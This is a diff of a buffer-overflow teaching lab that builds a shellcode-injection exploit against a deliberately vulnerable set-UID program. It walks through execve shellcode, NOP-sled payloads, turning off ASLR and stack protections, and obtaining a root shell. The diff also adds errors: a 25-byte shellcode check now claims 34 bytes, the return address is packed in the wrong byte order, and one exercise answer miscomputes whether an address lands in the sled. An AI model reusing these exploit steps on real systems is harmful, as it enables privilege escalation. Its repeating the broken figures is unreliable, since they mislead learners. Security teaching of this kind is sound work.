@@ -1,7 +1,7 @@
 # Lab 3: SEED Labs - Injecting Your Own Code (Shellcode)
 
 **Time:** 45-60 minutes  
-**Difficulty:** Advanced but we'll guide you step-by-step!
+**Difficulty:** Advanced (but we'll guide you step-by-step!)  
 **Goal:** Learn how to inject and execute your own code in a vulnerable program
 
 ---
@@ -36,6 +36,7 @@ Think of it this way:
 ### The Source Code
 
 Here's the program we'll exploit. Read through it and we'll explain each part:
+
 ```c
 #include <stdlib.h>
 #include <stdio.h>
@@ -78,32 +79,68 @@ int main(int argc, char **argv)
    - We control this file! We can put anything we want in it
 
 ### The Math
+
 ```
 Buffer size:     24 bytes
 Input size:     517 bytes
-Overflow:       517 - 24 = 493 bytes!
+Overflow:       517 - 24 = 493 bytes of overflow!
 ```
 
 **What this means:** We have 493 extra bytes that spill over and can overwrite other parts of memory!
 
-### Visual Representation
-```
-Stack memory layout:
+### Visual Representation: Stack Layout
 
-Higher addresses
-    ↑
-    | [Return Address]  ← We'll overwrite this!
-    | [Saved EBP]
-    | [buffer (24 bytes)] ← Starts here
-    ↓
-Lower addresses
+**Normal stack frame for bof() function:**
+
+```
+Memory Layout (Stack grows downward):
+
+Higher Addresses
+    |
+    v
+┌─────────────────────────────┐
+│  Return Address             │ ← Points back to main()
+│  (4 bytes)                  │
+├─────────────────────────────┤
+│  Saved EBP                  │ ← Previous stack frame pointer
+│  (4 bytes)                  │
+├─────────────────────────────┤
+│  buffer[23]                 │ ↑
+│  buffer[22]                 │ |
+│  ...                        │ | 24 bytes
+│  buffer[1]                  │ | (our buffer)
+│  buffer[0]                  │ ↓
+└─────────────────────────────┘
+    ^
+    |
+Lower Addresses
 ```
 
-**What happens when we overflow:**
-```
-Our 517 bytes:
+**What happens when we overflow with 517 bytes:**
 
-[24 bytes fill buffer] [Spills over and overwrites saved EBP] [Overwrites return address] [Keeps going...]
+```
+Our Input (517 bytes total):
+┌──────────────────────────────────────────────────┐
+│ Bytes 0-23:    Fill buffer (24 bytes)            │
+├──────────────────────────────────────────────────┤
+│ Bytes 24-27:   Overwrite saved EBP (4 bytes)     │
+├──────────────────────────────────────────────────┤
+│ Bytes 28-35:   Padding (8 bytes)                 │
+├──────────────────────────────────────────────────┤
+│ Bytes 36-39:   OVERWRITE RETURN ADDRESS!         │ ← Our target!
+├──────────────────────────────────────────────────┤
+│ Bytes 40-516:  Continue overflow (477 bytes)     │
+└──────────────────────────────────────────────────┘
+
+After overflow, stack looks like:
+┌─────────────────────────────┐
+│  0xffffcbd0                 │ ← Return address CHANGED!
+│  (points to our NOP sled)   │    (was pointing to main)
+├─────────────────────────────┤
+│  Overwritten data           │ ← Saved EBP destroyed
+├─────────────────────────────┤
+│  Filled with our input      │ ← Buffer full
+└─────────────────────────────┘
 ```
 
 ---
@@ -129,6 +166,7 @@ In Lab 2, we jumped to a function that already existed in the program (`win()`).
 ### Our Shellcode (Already Written For You)
 
 Here's the shellcode we'll use. Don't worry about understanding every byte - just know what it does:
+
 ```python
 shellcode = (
     b"\x31\xc0"             # xor eax, eax           - Clear EAX register
@@ -147,9 +185,37 @@ shellcode = (
 
 **Total size:** 34 bytes (very small!)
 
-### What Each Part Does (Simplified)
+### Shellcode Execution Flow Diagram
 
-Let me break down the shellcode into understandable chunks:
+```
+What the shellcode does step-by-step:
+
+STEP 1: Build string "/bin//sh" on stack
+┌─────────────────────┐
+│  Stack Memory:      │
+│  ┌───────────────┐  │
+│  │ /  b  i  n    │  │
+│  ├───────────────┤  │
+│  │ /  /  s  h \0 │  │
+│  └───────────────┘  │
+└─────────────────────┘
+
+STEP 2: Set up registers for execve() system call
+┌─────────────────────────────────┐
+│  EBX → points to "/bin//sh"     │ (program to execute)
+│  ECX → points to argv array     │ (arguments)
+│  EDX → 0x00000000               │ (environment, must be NULL!)
+│  EAX → 11 (0x0b)                │ (execve syscall number)
+└─────────────────────────────────┘
+
+STEP 3: Make system call
+  int 0x80  →  Kernel executes: execve("/bin//sh", argv, NULL)
+
+STEP 4: Shell spawns!
+  # ← You get a root shell prompt
+```
+
+### What Each Part Does (Simplified)
 
 **Step 1: Build the string "/bin/sh"**
 ```python
@@ -224,36 +290,71 @@ A **NOP sled** (also called a **NOP slide**) is a clever trick:
 
 **The idea:** Instead of one perfect landing spot, create a HUGE landing zone!
 
-### Visual Representation
+### NOP Sled Visual Diagram
+
 ```
-Our buffer with a NOP sled:
+Our 517-byte buffer with NOP sled:
 
-Memory Address    | Content
-------------------|----------------------------------
-0xffffcb08        | NOP (\x90)  ← Jump here? Works!
-0xffffcb09        | NOP (\x90)  ← Or here? Works!
-0xffffcb0a        | NOP (\x90)  ← Or here? Works!
-0xffffcb0b        | NOP (\x90)  ← Or here? Works!
-...               | ... 200 more NOPs ...
-0xffffcbd0        | NOP (\x90)  ← Jump here? Works! (our target)
-0xffffcbd1        | NOP (\x90)
-...               | ... more NOPs ...
-0xffffcc00        | Shellcode starts here! (34 bytes)
-0xffffcc01        | Shellcode byte 2
-...               | ...
-0xffffcc21        | Shellcode byte 34 (end)
+Memory Address    | Content                | What happens
+------------------|------------------------|---------------------------
+0xffffcb08        | NOP (\x90)            | ← Jump here? Executes NOP
+0xffffcb09        | NOP (\x90)            |   Slides forward...
+0xffffcb0a        | NOP (\x90)            |   Slides forward...
+...               | ... (200 NOPs) ...    |   Slides forward...
+0xffffcbd0        | NOP (\x90)            | ← Our target jump address
+0xffffcbd1        | NOP (\x90)            |   Slides forward...
+...               | ... (more NOPs) ...   |   Slides forward...
+0xffffcc00        | \x31 (shellcode!)     | ← Reaches shellcode!
+0xffffcc01        | \xc0 (shellcode)      |   Executes our code!
+0xffffcc02        | \x50 (shellcode)      |   Executes our code!
+...               | ... (34 bytes) ...    |   Executes our code!
+0xffffcc21        | End of shellcode      |   Shell spawns!
+
+Complete Buffer Layout (517 bytes):
+┌──────────────────────────────────────┐
+│ Bytes 0-35:    NOPs + Return Addr    │
+├──────────────────────────────────────┤
+│ Bytes 36-39:   0xffffcbd0            │ ← Points to NOP sled
+├──────────────────────────────────────┤
+│ Bytes 40-482:  NOP NOP NOP ...       │ ← 443 NOPs (landing zone)
+├──────────────────────────────────────┤
+│ Bytes 483-516: Shellcode (34 bytes)  │ ← Our injected code
+└──────────────────────────────────────┘
 ```
 
-### How It Works
+### How It Works: The Slide
 
-**When we jump to ANY NOP:**
-1. CPU executes the NOP (does nothing)
-2. Moves to next instruction (another NOP)
-3. Executes that NOP (does nothing)
-4. Moves to next instruction (another NOP)
-5. Keeps going... slide, slide, slide...
-6. Eventually hits our shellcode!
-7. **Shellcode executes!**
+**When we jump to ANY address in the NOP sled:**
+
+```
+Step-by-step execution:
+
+1. Jump to 0xffffcbd0
+   CPU reads: 0x90 (NOP)
+   CPU does: Nothing, moves to next instruction
+
+2. Now at 0xffffcbd1  
+   CPU reads: 0x90 (NOP)
+   CPU does: Nothing, moves to next instruction
+
+3. Now at 0xffffcbd2
+   CPU reads: 0x90 (NOP)
+   CPU does: Nothing, moves to next instruction
+
+   ... continues for hundreds of bytes ...
+
+443. Now at 0xffffcc00
+   CPU reads: 0x31 (first byte of shellcode!)
+   CPU does: Executes "xor eax, eax"
+
+444. Now at 0xffffcc01
+   CPU reads: Next shellcode byte
+   CPU does: Continues executing our shellcode
+
+   ... shellcode executes ...
+
+Result: Shell spawns!
+```
 
 ### Real-World Analogy
 
@@ -265,12 +366,17 @@ Think of it like bowling:
 
 Instead of needing the EXACT address (like `0xffffcc00`), we can jump to ANY address in a 200-byte range!
 
-- Jump to `0xffffcb08`? Slides to shellcode! ✓
-- Jump to `0xffffcb50`? Slides to shellcode! ✓
-- Jump to `0xffffcbd0`? Slides to shellcode! ✓
-- Jump to `0xffffcbf0`? Slides to shellcode! ✓
+```
+Forgiveness Zone:
 
-**200 bytes of forgiveness instead of 1 byte precision!**
+Jump to 0xffffcb08? → Slides to shellcode → Works!
+Jump to 0xffffcb50? → Slides to shellcode → Works!
+Jump to 0xffffcbd0? → Slides to shellcode → Works!
+Jump to 0xffffcbf0? → Slides to shellcode → Works!
+Jump to 0xffffcc00? → At shellcode! → Works!
+
+200+ bytes of forgiveness instead of 1 byte precision!
+```
 
 ---
 
@@ -278,7 +384,7 @@ Instead of needing the EXACT address (like `0xffffcc00`), we can jump to ANY add
 
 **Purpose of this section:** Learn from 3+ hours of debugging so you don't make the same mistakes!
 
-### ⚠️ Mistake #1: Wrong Compilation Flags
+### Mistake #1: Wrong Compilation Flags
 
 **The Problem:** If you compile the program wrong, your exploit will ALWAYS fail, no matter what you do.
 
@@ -289,6 +395,7 @@ Instead of needing the EXACT address (like `0xffffcc00`), we can jump to ANY add
 ### How to Compile CORRECTLY
 
 **ALWAYS use this EXACT command:**
+
 ```bash
 gcc -m32 -fno-stack-protector -z execstack -no-pie -o stack stack.c
 ```
@@ -332,7 +439,7 @@ stack: ELF 32-bit LSB pie executable...
 
 ---
 
-### ⚠️ Mistake #2: Using Addresses from GDB
+### Mistake #2: Using Addresses from GDB
 
 **The Problem:** Addresses you find in GDB (the debugger) are WRONG for the real program!
 
@@ -340,7 +447,41 @@ stack: ELF 32-bit LSB pie executable...
 
 **Why it happens:** GDB adds extra environment variables when debugging, shifting the stack by ~224 bytes.
 
+### GDB vs Runtime Address Difference Diagram
+
+```
+Address Comparison:
+
+┌─────────────────────────────────────┐
+│        IN GDB (Debugging):          │
+│  ┌───────────────────────────────┐  │
+│  │ Buffer at: 0xffffcce8         │  │ ← GDB shows this
+│  └───────────────────────────────┘  │
+└─────────────────────────────────────┘
+                  |
+                  | GDB adds environment variables:
+                  | - LINES
+                  | - COLUMNS
+                  | - _ (path to program)
+                  | 
+                  v Stack shifts by ~224 bytes (0xe0)
+                  
+┌─────────────────────────────────────┐
+│      IN RUNTIME (Normal Run):       │
+│  ┌───────────────────────────────┐  │
+│  │ Buffer at: 0xffffcb08         │  │ ← Real address!
+│  └───────────────────────────────┘  │
+└─────────────────────────────────────┘
+
+Difference: 0xffffcce8 - 0xffffcb08 = 0xe0 (224 bytes)
+
+WHY THIS MATTERS:
+If you use GDB address (0xffffcce8) in your exploit,
+you'll jump to the WRONG place when running normally!
+```
+
 ### Example of the Problem
+
 ```bash
 # In GDB (debugger):
 (gdb) x/x buffer
@@ -355,6 +496,7 @@ stack: ELF 32-bit LSB pie executable...
 ### The Solution: Create a Debug Program
 
 We'll modify the program to print its own address. Create a file called `stack_debug.c`:
+
 ```c
 #include <stdlib.h>
 #include <stdio.h>
@@ -370,8 +512,7 @@ int bof(char *str)
 {
     char buffer[24];
     
-    // ⭐ THIS IS THE KEY LINE ⭐
-    // Print the buffer's real address at runtime
+    // This is the key line - prints the buffer's real address
     printf("Buffer address: 0x%x\n", (unsigned int)buffer);
     printf("Stack pointer: 0x%lx\n", get_sp());
     
@@ -395,6 +536,7 @@ int main(int argc, char **argv)
 **What this does:** Prints the buffer's address when you run it normally (not in GDB).
 
 ### How to Use It
+
 ```bash
 # Compile the debug version
 gcc -m32 -fno-stack-protector -z execstack -no-pie -o stack_debug stack_debug.c
@@ -417,7 +559,7 @@ Stack pointer: 0xffffcc20
 
 ---
 
-### ⚠️ Mistake #3: Dirty EDX Register
+### Mistake #3: Dirty EDX Register
 
 **The Problem:** Shell spawns for a split second, then crashes immediately.
 
@@ -433,9 +575,45 @@ Segmentation fault    ← Crashes!
 
 **This took 3 hours to debug!** The shell would spawn but die instantly.
 
+### EDX Register Issue Diagram
+
+```
+System Call Requirements for execve():
+
+┌──────────────────────────────────────────┐
+│  execve() System Call (number 11)        │
+├──────────────────────────────────────────┤
+│  Required Register Values:               │
+│                                          │
+│  EBX → pointer to program path           │ ✓ We set this
+│        ("/bin//sh")                      │
+│                                          │
+│  ECX → pointer to argv array             │ ✓ We set this
+│        (arguments)                       │
+│                                          │
+│  EDX → pointer to envp OR NULL           │ ✗ Contains garbage!
+│        (environment)                     │    MUST be 0!
+│                                          │
+│  EAX → 11 (syscall number)               │ ✓ We set this
+└──────────────────────────────────────────┘
+
+What happens with dirty EDX:
+┌────────────────────────────────────┐
+│ EDX = 0x41414141 (garbage)        │ → execve() FAILS!
+│ System call returns error          │ → Shell crashes!
+└────────────────────────────────────┘
+
+What happens with clean EDX:
+┌────────────────────────────────────┐
+│ EDX = 0x00000000 (NULL)           │ → execve() SUCCEEDS!
+│ Shell launches properly            │ → We get root!
+└────────────────────────────────────┘
+```
+
 ### The Fix (Already in Our Shellcode)
 
 Look at this line in our shellcode:
+
 ```python
 b"\x31\xd2"    # xor edx, edx
 ```
@@ -452,23 +630,44 @@ b"\x31\xd2"    # xor edx, edx
 
 **Purpose of this section:** Put everything together into a working exploit script.
 
-### The Overall Strategy
+### The Overall Strategy: Payload Structure
 
-Our payload will look like this:
 ```
-Byte positions     | What goes there        | Why
--------------------|------------------------|---------------------------
-0 - 35             | NOPs (\x90)            | Padding before return address
-36 - 39            | Return address         | Points to our NOP sled
-40 - 482           | NOPs (\x90)            | The NOP sled (443 bytes!)
-483 - 516          | Shellcode (34 bytes)   | Our injected code
-```
+Complete 517-byte payload layout:
 
-**Total:** 517 bytes (exactly what the program reads!)
+Byte Range     | Content              | Purpose
+---------------|----------------------|---------------------------
+0 - 35         | NOP NOP NOP ...      | Padding before return addr
+               | (\x90 repeated)      | 
+---------------|----------------------|---------------------------
+36 - 39        | 0xbd 0xcb 0xff 0xff  | Return address
+               | (little-endian)      | Points to buffer+200
+---------------|----------------------|---------------------------
+40 - 482       | NOP NOP NOP ...      | NOP sled (landing zone)
+               | (\x90 repeated)      | 443 NOPs total!
+---------------|----------------------|---------------------------
+483 - 516      | \x31\xc0\x50\x68...  | Shellcode (34 bytes)
+               | (our injected code)  | Spawns /bin/sh
+---------------|----------------------|---------------------------
+
+Visual representation:
+┌─────────────────────────────────────────┐
+│  36 bytes of NOPs                       │
+├─────────────────────────────────────────┤
+│  0xffffcbd0 (return address)            │ ← Overwrites saved EIP
+├─────────────────────────────────────────┤
+│  443 bytes of NOPs (NOP sled)           │ ← Landing zone
+├─────────────────────────────────────────┤
+│  34 bytes of shellcode                  │ ← Our malicious code
+└─────────────────────────────────────────┘
+
+Total: 517 bytes (exactly what program reads!)
+```
 
 ### The Exploit Code
 
 Create a file called `seedlabs_exploit.py`:
+
 ```python
 #!/usr/bin/env python3
 # This script generates the malicious payload
@@ -499,8 +698,7 @@ print(f"[+] Shellcode is {len(shellcode)} bytes")  # Should be 34
 # PART 2: Set the addresses
 # ============================================================================
 
-# ⭐ CHANGE THIS! ⭐
-# Get this address from running stack_debug
+# CHANGE THIS - Get this address from running stack_debug
 buffer_addr = 0xffffcb08    # ← PUT YOUR ADDRESS HERE!
 
 # We'll jump to the middle of the NOP sled (200 bytes in)
@@ -576,6 +774,7 @@ print("[+] You should get a root shell!")
 ### Step 1: Prepare the System
 
 **First, disable address randomization:**
+
 ```bash
 sudo sysctl -w kernel.randomize_va_space=0
 ```
@@ -590,6 +789,7 @@ sudo sysctl -w kernel.randomize_va_space=0
 ---
 
 ### Step 2: Compile the Vulnerable Program
+
 ```bash
 # Navigate to the directory
 cd ~/buffer-overflow-teaching-kit/vulnerable-programs/seedlabs-stack
@@ -605,6 +805,7 @@ file stack
 ---
 
 ### Step 3: Make it a Set-UID Program
+
 ```bash
 # Change owner to root
 sudo chown root stack
@@ -632,6 +833,7 @@ ls -l stack
 ---
 
 ### Step 4: Find the Buffer Address
+
 ```bash
 # Compile the debug version
 gcc -m32 -fno-stack-protector -z execstack -no-pie -o stack_debug stack_debug.c
@@ -655,6 +857,7 @@ Stack pointer: 0xffffcc20
 ### Step 5: Update Your Exploit
 
 **Open `seedlabs_exploit.py` and change this line:**
+
 ```python
 buffer_addr = 0xffffcb08    # ← PUT THE ADDRESS YOU JUST GOT!
 ```
@@ -664,6 +867,7 @@ buffer_addr = 0xffffcb08    # ← PUT THE ADDRESS YOU JUST GOT!
 ---
 
 ### Step 6: Generate the Payload
+
 ```bash
 # Navigate to exploits directory
 cd ~/buffer-overflow-teaching-kit/exploits
@@ -689,6 +893,7 @@ python3 seedlabs_exploit.py
 ---
 
 ### Step 7: Execute the Attack!
+
 ```bash
 # Go to where the vulnerable program is
 cd ~/buffer-overflow-teaching-kit/vulnerable-programs/seedlabs-stack
@@ -700,11 +905,13 @@ cd ~/buffer-overflow-teaching-kit/vulnerable-programs/seedlabs-stack
 ### What Should Happen
 
 **If successful, you'll get a shell prompt:**
+
 ```bash
 #     ← This is a root shell prompt!
 ```
 
 **Try these commands:**
+
 ```bash
 # whoami
 root
@@ -728,66 +935,119 @@ badfile  stack  stack.c
 
 ---
 
-## Section 7: What Just Happened? (Step-by-Step)
+## Section 7: What Just Happened? (Attack Timeline)
 
 **Purpose of this section:** Understand the complete attack flow.
 
-### The Attack Timeline
+### The Attack Timeline Diagram
 
-**1. Program starts:**
 ```
-main() reads 517 bytes from badfile into str[]
+Complete Attack Flow:
+
+STEP 1: Program Starts
+┌──────────────────────────────────────┐
+│ main() opens "badfile"               │
+│ Reads 517 bytes into str[]           │
+└──────────────────────────────────────┘
+                |
+                v
+STEP 2: bof() Called
+┌──────────────────────────────────────┐
+│ bof(str) receives 517-byte string    │
+│ Tries to strcpy() into 24-byte buffer│
+└──────────────────────────────────────┘
+                |
+                v
+STEP 3: Buffer Overflow
+┌──────────────────────────────────────┐
+│ BEFORE:                 AFTER:       │
+│ [ret addr: main]  →  [ret: 0xffffcbd0]
+│ [saved EBP]       →  [NOPs]          │
+│ [buffer: empty]   →  [buffer: NOPs]  │
+└──────────────────────────────────────┘
+                |
+                v
+STEP 4: Function Returns
+┌──────────────────────────────────────┐
+│ bof() finishes, tries to return      │
+│ Reads return address from stack      │
+│ Jumps to: 0xffffcbd0 (our NOP sled!) │
+│ (Instead of returning to main)       │
+└──────────────────────────────────────┘
+                |
+                v
+STEP 5: NOP Sled Execution
+┌──────────────────────────────────────┐
+│ 0xffffcbd0: NOP → continue           │
+│ 0xffffcbd1: NOP → continue           │
+│ 0xffffcbd2: NOP → continue           │
+│ ... slides through NOPs ...          │
+│ 0xffffcc00: Reaches shellcode!       │
+└──────────────────────────────────────┘
+                |
+                v
+STEP 6: Shellcode Executes
+┌──────────────────────────────────────┐
+│ Builds string "/bin//sh"             │
+│ Sets up registers:                   │
+│   EBX → "/bin//sh"                   │
+│   ECX → argv                         │
+│   EDX → 0 (NULL)                     │
+│   EAX → 11 (execve)                  │
+│ Calls: int 0x80                      │
+└──────────────────────────────────────┘
+                |
+                v
+STEP 7: Shell Spawns
+┌──────────────────────────────────────┐
+│ Kernel executes: execve("/bin//sh")  │
+│ New shell process starts as root     │
+│ We get: #  ← root prompt!           │
+└──────────────────────────────────────┘
 ```
 
-**2. bof() is called:**
+### Key Moments in the Attack
+
+**Moment 1: The Overflow**
 ```
-bof(str) tries to copy 517 bytes into a 24-byte buffer
+strcpy() copies 517 bytes into 24-byte buffer
+Overflow begins at byte 25, continues for 493 bytes
 ```
 
-**3. Buffer overflows:**
+**Moment 2: Return Address Overwrite**
 ```
-Stack before:                Stack after:
-[return address: main]       [return address: 0xffffcbd0] ← We changed this!
-[saved EBP]                  [overwritten with NOPs]
-[buffer: empty]              [buffer: filled with NOPs]
-```
-
-**4. bof() tries to return:**
-```
-Instead of returning to main(), it jumps to 0xffffcbd0 (our NOP sled)
+Bytes 36-39 overwrite the saved return address
+Old value: 0x080485xx (points to main)
+New value: 0xffffcbd0 (points to our NOP sled)
 ```
 
-**5. Execution slides through NOPs:**
+**Moment 3: The Jump**
 ```
-0xffffcbd0: NOP (\x90) → do nothing, move forward
-0xffffcbd1: NOP (\x90) → do nothing, move forward
-0xffffcbd2: NOP (\x90) → do nothing, move forward
-... keeps going ...
-```
-
-**6. Reaches our shellcode:**
-```
-0xffffcc00: First byte of shellcode
-CPU starts executing our injected code!
+When bof() executes 'ret' instruction:
+  Pops address from stack: 0xffffcbd0
+  Jumps to that address
+  CPU now executing our NOP sled!
 ```
 
-**7. Shellcode executes:**
+**Moment 4: The Slide**
 ```
-- Builds the string "/bin/sh"
-- Calls execve() system call
-- OS launches /bin/sh
+Executes hundreds of NOPs
+Each NOP does nothing, just moves forward
+Eventually reaches our shellcode
 ```
 
-**8. We get a shell:**
+**Moment 5: Root Shell**
 ```
-#     ← Root shell prompt!
+Shellcode calls execve()
+OS spawns /bin/sh with root privileges
+We gain root access!
 ```
 
 ---
 
 ## Section 8: Simple Exercise
 
-**Purpose of this section:** Test your understanding with a hands-on challenge.
+**Purpose of this section:** Test your understanding with hands-on challenges.
 
 ### Exercise: Break It On Purpose!
 
@@ -797,23 +1057,32 @@ Let's experiment to understand how precise exploits need to be.
 
 1. Open `seedlabs_exploit.py`
 2. Change the buffer address to something wrong:
-```python
+   ```python
    buffer_addr = 0xffffcb00    # Off by 8 bytes!
-```
+   ```
 3. Run `python3 seedlabs_exploit.py`
 4. Run `./stack`
 
 **Question:** What happens?
+
 <details>
-<summary>Click to see</summary>
+<summary>Click to see answer</summary>
+
 **Segmentation fault!** The program crashes because we jumped to the wrong address.
+
+**Why:** Our return address points to 0xffffcb00 + 200 = 0xffffcbc8, but the buffer actually starts at 0xffffcb08. We jumped outside our NOP sled, likely to invalid memory or code that doesn't make sense. The CPU can't execute whatever is there, so it crashes.
+
+**Lesson:** Address precision matters! Even being off by a few bytes can break the exploit (though NOP sleds give us some forgiveness).
+
 </details>
+
+---
 
 **Challenge 2: Remove EDX Clearing**
 
 1. Open `seedlabs_exploit.py`
 2. Remove the line with `\x31\xd2` from shellcode:
-```python
+   ```python
    shellcode = (
        b"\x31\xc0"
        b"\x50"
@@ -827,29 +1096,49 @@ Let's experiment to understand how precise exploits need to be.
        b"\xb0\x0b"
        b"\xcd\x80"
    )
-```
+   ```
 3. Run the exploit
 
 **Question:** What happens?
+
 <details>
-<summary>Click to see</summary>
+<summary>Click to see answer</summary>
+
 Shell might spawn very briefly but crashes immediately! This shows why clearing EDX is critical.
+
+**Why:** The execve() system call requires EDX to be NULL (0). If EDX contains garbage (leftover data from previous operations), the system call fails. The kernel returns an error, and our shell process immediately terminates.
+
+**Lesson:** System calls have specific requirements. You must set up registers correctly, or the call will fail.
+
 </details>
+
+---
 
 **Challenge 3: Make NOP Sled Tiny**
 
 1. Change the payload to have almost no NOPs:
-```python
+   ```python
    # Instead of 517 NOPs, let's use mostly shellcode
    payload = bytearray([0x90] * 50)  # Only 50 bytes total
-```
+   payload[36:40] = struct.pack("<I", buffer_addr + 10)
+   payload[40:40+len(shellcode)] = shellcode
+   ```
 2. Try to make the exploit work
 
 **Question:** Is it harder or easier?
+
 <details>
-<summary>Click to see</summary>
+<summary>Click to see answer</summary>
+
 Much harder! With a small NOP sled, you need almost exact addresses. The big NOP sled gives you forgiveness.
+
+**Why:** With a large NOP sled (200+ bytes), you can be off by dozens of bytes and still land somewhere in the sled. With a tiny sled (10-20 bytes), being off by even 5 bytes might miss the sled entirely and crash.
+
+**Lesson:** NOP sleds are a reliability technique. Bigger sled = more reliable exploit.
+
 </details>
+
+---
 
 **After experimenting, restore the original exploit code!**
 
@@ -866,27 +1155,27 @@ Much harder! With a small NOP sled, you need almost exact addresses. The big NOP
 **Check these things:**
 
 1. **Is the buffer address correct?**
-```bash
+   ```bash
    # Run stack_debug again to verify
    ./stack_debug
    # Update seedlabs_exploit.py with the address it prints
-```
+   ```
 
 2. **Did you compile with -no-pie?**
-```bash
+   ```bash
    file stack
    # Should NOT say "pie executable"
    # If it does, recompile:
    gcc -m32 -fno-stack-protector -z execstack -no-pie -o stack stack.c
-```
+   ```
 
 3. **Is ASLR disabled?**
-```bash
+   ```bash
    cat /proc/sys/kernel/randomize_va_space
    # Should output: 0
    # If not, run:
    sudo sysctl -w kernel.randomize_va_space=0
-```
+   ```
 
 ---
 
@@ -931,7 +1220,9 @@ cd ~/buffer-overflow-teaching-kit/exploits
 python3 seedlabs_exploit.py
 
 # This creates badfile in the current directory
-# Now copy it or run stack from here
+# Now go to where stack is and run it
+cd ~/buffer-overflow-teaching-kit/vulnerable-programs/seedlabs-stack
+./stack
 ```
 
 ---
@@ -941,18 +1232,18 @@ python3 seedlabs_exploit.py
 **Possible causes:**
 
 1. **Wrong directory:**
-```bash
+   ```bash
    # Make sure badfile is in the same directory as stack
    cd ~/buffer-overflow-teaching-kit/vulnerable-programs/seedlabs-stack
    ls badfile  # Should exist
-```
+   ```
 
 2. **Shellcode is wrong:**
-```bash
+   ```bash
    # Verify shellcode length
    python3 -c "shellcode = b'\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\x31\\xd2\\xb0\\x0b\\xcd\\x80'; print(len(shellcode))"
-   # Should output: 25
-```
+   # Should output: 34
+   ```
 
 ---
 
@@ -960,16 +1251,17 @@ python3 seedlabs_exploit.py
 
 **Purpose of this section:** Recap what you learned and where to go next.
 
-### What You Accomplished 🎉
+### What You Accomplished
 
 You just completed one of the most advanced buffer overflow attacks! Here's what you did:
 
-✅ **Understood code injection** - How to inject your own code into a running program  
-✅ **Learned about shellcode** - Machine code that spawns a shell  
-✅ **Used NOP sleds** - A clever technique for reliable exploits  
-✅ **Avoided critical mistakes** - PIE compilation, GDB addresses, EDX register  
-✅ **Built a complete exploit** - From analyzing the vulnerability to getting root  
-✅ **Spawned a root shell** - Gained root access through code injection
+**Technical Skills Gained:**
+- Understood code injection - How to inject your own code into a running program
+- Learned about shellcode - Machine code that spawns a shell
+- Used NOP sleds - A clever technique for reliable exploits
+- Avoided critical mistakes - PIE compilation, GDB addresses, EDX register
+- Built a complete exploit - From analyzing the vulnerability to getting root
+- Spawned a root shell - Gained root access through code injection
 
 ### Key Concepts You Mastered
 
@@ -1003,7 +1295,7 @@ Now that you understand attacks, you're ready to learn defenses:
 - How to prevent buffer overflows
 - Best practices for secure programming
 
-**Congratulations on completing the hardest lab!** 🚀
+**Congratulations on completing the hardest lab!**
 
 You now understand one of the most powerful exploitation techniques in cybersecurity!
 
@@ -1048,4 +1340,4 @@ exit
 
 ---
 
-**End of Lab 3** 🎓
+**End of Lab 3**
